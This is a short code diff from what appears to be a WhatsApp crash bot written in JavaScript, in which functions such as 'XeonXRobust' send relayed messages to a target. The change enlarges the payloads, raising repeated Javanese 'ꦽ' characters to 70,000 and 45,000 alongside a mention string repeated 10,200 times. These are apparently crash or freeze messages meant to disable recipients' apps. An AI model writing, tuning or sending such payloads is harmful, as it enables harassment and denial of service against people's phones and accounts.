@@ -425,7 +425,7 @@ const wanted = {
 		
 		    async function XeonXRobust(target, o, Ptcp = true) {
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(10000);
+	const ui = 'ꦽ'.repeat(70000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -514,7 +514,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Bro can your please help me" + "ꦽ".repeat(30000),
+title: "Bro can your please help me" + "ꦽ".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
